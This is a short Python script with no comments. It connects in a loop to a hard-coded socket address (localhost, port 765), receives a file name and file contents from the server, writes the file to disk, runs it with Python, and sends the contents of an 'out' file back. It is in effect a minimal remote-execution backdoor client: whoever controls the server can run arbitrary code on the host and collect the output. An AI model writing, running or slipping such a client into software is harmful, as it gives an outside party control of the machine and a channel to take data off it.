import socket,time
import subprocess as sub
Ip = '127.0.0.1'
Port = 765

soc = socket.socket()



def main():
    while True:
        try:
            soc.connect((Ip,Port))
            print('Connected')
            break
        except:
            pass
    while True:
        FN = soc.recv(100).decode('utf-8')
        data = soc.recv(2048)
    
        soc.send(b'1')
        File = open(FN,'wb')
        File.write(data)
        File.close()
        sub.run('python '+FN)
        try:
            File = open('out','rb')
            data = File.read()
        except:
            data = b''
        time.sleep(1)
        soc.send(data)
        print('Done')
        input()
        
    
    

main()